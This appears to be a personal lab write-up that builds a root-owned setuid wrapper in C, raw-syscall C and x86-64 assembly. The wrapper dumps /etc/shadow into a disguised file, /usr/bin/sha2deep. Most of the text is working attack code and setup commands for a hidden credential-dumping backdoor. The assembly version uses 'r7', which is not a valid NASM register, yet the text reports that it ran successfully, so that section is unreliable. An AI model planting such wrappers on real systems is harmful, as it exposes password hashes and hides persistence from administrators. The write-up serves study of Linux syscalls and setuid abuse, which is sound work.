## privilege-escalation-setuid-binary
## I. Concept

### 1. Chose a file to target
```bash
/etc/shadow
```
decided to select shadow
 
### 2. Chose output directory/filename
```bash
/usr/bin/sha2deep
```
Output masquerading as legitimate blending in with normal system filenames in /usr/bin

### 3. Create script:
```bash
#!/bin/bash
cat /etc/shadow > /usr/bin/sha2deep
```
Ran as normal user; permission denied as expected

## II.  Implement with C Wrapper

### 1. Write the C wrapper
```bash
vim wrapper.c
```
```c
#include <unistd.h>
#include <fcntl.h>

int main() {
    int fd = open("/usr/bin/sha2deep", O_WRONLY | O_CREAT | O_TRUNC, 0600);
    dup2(fd, STDOUT_FILENO);
    close(fd);

    char *args[] = {"/bin/cat", "/etc/shadow", NULL};
    execve("/bin/cat", args, NULL);
    return 0;
}
```
#### Notes:
```c
int fd = open("/usr/bin/sha2deep", O_WRONLY | O_CREAT | O_TRUNC, 0600);
```
Standard file descriptor, open the target file, set the bitwise flags to open/create file cleanly and set permissions to 0600 to give read/write for owner
```c
dup2(fd, STDOUT_FILENO);
```
Use dup2 to make my fd the standard output so cat uses that instead
```c
close(fd);
```
Clean up the original file descriptor
```c
char *args[] = {"/bin/cat", "/etc/shadow", NULL};
```
Declare an array of strings for the arguments for the next function (execve) to run cat on /etc/shadow 
```c
execve("/bin/cat", args, NULL);
```
Run execve with the arguments  - done.

### 2. Compile
```bash
gcc wrapper.c -o wrapper
```

### 3. Set ownership and setuid bit
```bash
sudo chown root:root wrapper
sudo chmod u+s wrapper
```

### 4. Verify the setuid bit
```bash
ls -l wrapper
```
Output: `-rwsrwxr-x`

### 5. Run it
```bash
./wrapper
```
Ran with normal user privileges. Successfully wrote `/etc/shadow` output to `/usr/bin/sha2deep`, `cat` to verify.



## III. C wrapper with syscalls
Here I wanted to remove library headers and replace with syscalls and exact definitions that are needed

```c
#define STDOUT_FILENO 1
#define O_WRONLY  01
#define O_CREAT   0100
#define O_TRUNC   01000
#define S_IRUSR   0400
#define S_IWUSR   0200

static inline long syscall3(long num, long a1, long a2, long a3)
{
    long ret;
    __asm__ __volatile__(
        "syscall"
        : "=a"(ret)
        : "a"(num), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}

int main(void) {
long fd = syscall3(2, (long)"/usr/bin/sha2deep", 
                        O_WRONLY | O_CREAT | O_TRUNC, 
                        S_IRUSR | S_IWUSR);

    if (fd < 0) return 1;
    syscall3(33, fd, STDOUT_FILENO, 0);
    syscall3(3, fd, 0, 0);
    char *args[] = {"/bin/cat", "/etc/shadow", 0};
    syscall3(59, (long)"/bin/cat", (long)args, 0);
    return 0;
}
```
### Still run through steps II.2 - II.5 to compile and run
#### Notes

```c
#define STDOUT_FILENO 1
#define O_WRONLY  01
#define O_CREAT   0100
#define O_TRUNC   01000
#define S_IRUSR   0400
#define S_IWUSR   0200
```
Definitions to replace library headers

```c
static inline long syscall3(long num, long a1, long a2, long a3)
{
    long ret;
    __asm__ __volatile__(
        "syscall"
        : "=a"(ret)
        : "a"(num), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}
```
Custom assembly helper syscall with 3 args to make syscalls trigger properly with Linux kernel as standard C functions would

```c
    long fd = syscall3(2, (long)"/usr/bin/sha2deep", 
                        O_WRONLY | O_CREAT | O_TRUNC, 
                        S_IRUSR | S_IWUSR);

    if (fd < 0) return 1;
```
Syscall #2 for open  
Expects x64 long values for the file path, flags, and mode    
Manual error check for negative returns from kernel

```c
    syscall3(33, fd, STDOUT_FILENO, 0);
```
Syscall #33 for dup2


```c
    syscall3(3, fd, 0, 0);
```
Syscall #3 for close

```c
    char *args[] = {"/bin/cat", "/etc/shadow", 0};
    syscall3(59, (long)"/bin/cat", (long)args, 0);

    return 0;
}
```
Syscall #59 for execve  
Standard end NULL no longer needed since kernel is reading 0 arg directly

## IV. C wrapper without definitions

```c
static inline long syscall3(long num, long a1, long a2, long a3)
{
    long ret;
    __asm__ __volatile__(
        "syscall"
        : "=a"(ret)
        : "a"(num), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}

int main(void) {
    long fd = syscall3(2, (long)"/usr/bin/sha2deep", 01101, 0600);

    if (fd < 0) return 1;
    syscall3(33, fd, 1, 0);
    syscall3(3, fd, 0, 0);
    char *args[] = {"/bin/cat", "/etc/shadow", 0};
    syscall3(59, (long)"/bin/cat", (long)args, 0);
    
    return 0;
}
```

### Still run through steps II.2 - II.5 to compile and run

#### Notes

```c
    long fd = syscall3(2, (long)"/usr/bin/sha2deep", 01101, 0600);
```
Replaced Syscall #2's standard human-readable bitwise macros with raw octal values. 
O_WRONLY | O_CREAT | O_TRUNC = 01101
S_IRUSR | S_IWUSR = 0600

```c
    syscall3(33, fd, 1, 0);
```
Syscall #33's STDOUT_FILENO = 1

## V.  x86-64 Assembly Implementation
To go one step lower and remove C wrapper/compiler, I wanted to directly invoke syscalls via assembly.

### 1. Write the assembly script
```bash
vim wrapper.asm
```

```assembly
global _start

section .text
_start:
    ; --- 1. sys_open ---
    xor rax, rax
    push rax                    ; Push NULL terminator

    ; Push "///usr/bin/sha2deep" in reverse (Little-Endian)
    push 0x00706565             ; "eep\0"
    mov rbx, 0x64326168732f6e69 ; "in/sha2d"
    push rbx
    mov rbx, 0x622f7273752f2f2f ; "///usr/b"
    push rbx

    mov rdi, rsp                ; RDI = file path string
    mov rsi, 577                ; Flags: 01101 octal = 577 decimal
    mov rdx, 384                ; Mode: 0600 octal = 384 decimal
    mov rax, 2                  ; Syscall #2 (sys_open)
    syscall

    cmp rax, 0                  ; Manual error check
    js exit_fail
    mov r12, rax                ; Save fd to r12

    ; --- 2. sys_dup2 ---
    mov rdi, r12                ; Old FD
    mov rsi, 1                  ; New FD (1 = stdout)
    mov rax, 33                 ; Syscall #33 (sys_dup2)
    syscall

    ; --- 3. sys_close ---
    mov rdi, r12                ; FD to close
    mov rax, 3                  ; Syscall #3 (sys_close)
    syscall

    ; --- 4. sys_execve ---
    ; Build "/etc/shadow"
    xor rax, rax
    push rax                    ; NULL terminator
    mov rbx, 0x00776f646168732f ; "/shadow\0"
    push rbx
    mov rbx, 0x6374652f2f2f2f2f ; "/////etc"
    push rbx
    mov r8, rsp                 ; R8 = pointer to /etc/shadow

    ; Build "/bin/cat"
    xor rax, rax
    push rax                    ; NULL terminator
    mov rbx, 0x7461632f6e69622f ; "/bin/cat"
    push rbx
    mov r7, rsp                 ; R7 = pointer to /bin/cat

    ; Build args array: [/bin/cat, /etc/shadow, NULL]
    xor rax, rax
    push rax                    ; NULL
    push r8                     ; argv[1]
    push r7                     ; argv[0]
    mov rsi, rsp                ; RSI = array pointer

    mov rdi, r7                 ; RDI = executable path
    xor rdx, rdx                ; RDX = NULL environment
    mov rax, 59                 ; Syscall #59 (sys_execve)
    syscall

exit_fail:
    mov rax, 60                 ; Syscall #60 (sys_exit)
    mov rdi, 1                  
    syscall
```

#### Notes

```asm
    push 0x00706565             ; "eep\0"
    mov rbx, 0x64326168732f6e69 ; "in/sha2d"
```
Strings pushed to the stack backwards in 8-byte chunks due to x86-64 Little-Endian architecture.  
/usr/bin/sha2deep is padded with extra forward slashes to align with 8-byte boundaries.  

```asm
    mov rsi, 577                ; Flags: 01101 octal = 577 decimal
    mov rdx, 384                ; Mode: 0600 octal = 384 decimal
```
Assembly needs base-10 decimal or base-16 hex. Raw octal values from C wrapper (01101 and 0600) are converted to decimal equivalents (577 and 384) for the kernel.  
    
```asm
    push rax                    ; NULL
    push r8                     ; argv[1]
    push r7                     ; argv[0]
    mov rsi, rsp                ; RSI = array pointer
```
Manually constructing argument array directly in memory. Pushing pointers to the stack creates contiguous array that sys_execve expects, terminated with blank register (NULL).,

### 2. Compile and Link
Use NASM (Netwide Assembler) to compile the machine code, then link it into an executable binary  
```bash
nasm -f elf64 wrapper.asm -o wrapper.o  
ld wrapper.o -o wrapper  
```

### 3. Set ownership and setuid bit
```bash
sudo chown root:root wrapper
sudo chmod u+s wrapper
```

### 4. Verify the setuid bit
```bash
ls -l wrapper
```
Output: -rwsrwxr-x

### 5. Run it
```bash
./wrapper
```

Ran with normal user privileges. Successfully wrote /etc/shadow output to /usr/bin/sha2deep  
cat to verify